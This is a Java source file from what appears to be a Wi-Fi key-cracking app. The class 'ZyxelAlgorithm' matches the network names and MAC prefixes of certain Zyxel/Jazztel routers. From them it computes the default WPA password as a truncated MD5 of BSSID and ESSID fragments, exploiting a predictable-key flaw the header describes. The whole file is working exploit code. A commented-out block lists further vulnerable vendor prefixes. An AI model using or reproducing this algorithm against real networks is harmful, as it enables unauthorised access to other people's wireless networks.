package es.pulimento.wifi.core.algorithms;

import java.math.BigInteger;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

import es.pulimento.wifi.core.WirelessNetwork.WirelessEncryption;

/**
 * Zyxel algorithm.
 * This exploits a vulnerability in the following routers:
 * ZYXEL P660HW-B1A
 * NOTE: This stills need to be reviewed...
 */
public class ZyxelAlgorithm extends CrackAlgorithm {

	/**
	 * {@inheritDoc}
	 */
	public ZyxelAlgorithm(String essid, String bssid) {
		super(essid, bssid);
	}

	@Override
	protected void setPatterns() {

		// ESSID: WLAN_XXXX
		// BSSID: 00:1F:A4:XX:XX:XX
		addPattern("WLAN_([0-9a-fA-F]{4})", "(00:1F:A4:[0-9A-Fa-f:]{8})");

		// ESSID: JAZZTEL_XXXX
		// BSSID: 00:1F:A4:XX:XX:XX
		addPattern("JAZZTEL_([0-9a-fA-F]{4})", "(00:1F:A4:[0-9A-Fa-f:]{8})");
		
		
		// TODO: REVIEW!
		/*//matcher_md5Z[4] = Pattern.compile("WLAN_([0-9a-fA-F]{4})").matcher(mESSID); //WLAN_XXXX //Son TECOM, no vale
		//matcher_md5Z[5] = Pattern.compile("(00:19:15:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		//matcher_md5Z[6] = Pattern.compile("JAZZTEL_([0-9a-fA-F]{4})").matcher(mESSID); //JAZZTEL_XXXX
		//matcher_md5Z[7] = Pattern.compile("(00:19:15:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		matcher_md5Z[4] = Pattern.compile("WLAN_([0-9a-fA-F]{4})").matcher(mESSID); //WLAN_XXXX
		matcher_md5Z[5] = Pattern.compile("(00:23:F8:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		matcher_md5Z[6] = Pattern.compile("JAZZTEL_([0-9a-fA-F]{4})").matcher(mESSID); //JAZZTEL_XXXX
		matcher_md5Z[7] = Pattern.compile("(00:23:F8:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		matcher_md5Z[8] = Pattern.compile("WLAN_([0-9a-fA-F]{4})").matcher(mESSID); //WLAN_XXXX
		matcher_md5Z[9] = Pattern.compile("(40:4A:03:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		matcher_md5Z[10] = Pattern.compile("JAZZTEL_([0-9a-fA-F]{4})").matcher(mESSID); //JAZZTEL_XXXX
		matcher_md5Z[11] = Pattern.compile("(40:4A:03:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		matcher_md5Z[12] = Pattern.compile("WLAN_([0-9a-fA-F]{4})").matcher(mESSID); //WLAN_XXXX
		matcher_md5Z[13] = Pattern.compile("(98:F5:37:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		matcher_md5Z[14] = Pattern.compile("JAZZTEL_([0-9a-fA-F]{4})").matcher(mESSID); //JAZZTEL_XXXX
		matcher_md5Z[15] = Pattern.compile("(98:F5:37:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		matcher_md5Z[16] = Pattern.compile("WLAN_([0-9a-fA-F]{4})").matcher(mESSID); //WLAN_XXXX
		matcher_md5Z[17] = Pattern.compile("(F4:3E:61:[0-9A-Fa-f:]{8})").matcher(mBSSID);//GongJin Electronics Co.
		matcher_md5Z[18] = Pattern.compile("JAZZTEL_([0-9a-fA-F]{4})").matcher(mESSID); //JAZZTEL_XXXX
		matcher_md5Z[19] = Pattern.compile("(F4:3E:61:[0-9A-Fa-f:]{8})").matcher(mBSSID);//GongJin Electronics Co.*/
		
	}

	@Override
	protected String crackAlgorithm(String essid_data, String bssid_data) {
		essid_data = essid_data.toUpperCase();
		bssid_data = bssid_data.replace(":", "").toUpperCase();
   		return MD5Hash(bssid_data.substring(0,8).toLowerCase()+essid_data.substring(essid_data.length()-4, essid_data.length()).toLowerCase()).toLowerCase();	
	}

	private static String MD5Hash(String input) {
		try {
			String hashtext = (new BigInteger(1, MessageDigest.getInstance("MD5").digest(input.getBytes()))).toString(16);
			while (hashtext.length() < 20)
				hashtext = "0" + hashtext;
			return hashtext.substring(0, 20);
		} catch (NoSuchAlgorithmException e) {
			throw new RuntimeException(e);
		}
	}

	public static boolean supportsEncryption(WirelessEncryption mCapabilities) {
		return mCapabilities.equals(WirelessEncryption.WPA);
	}
}
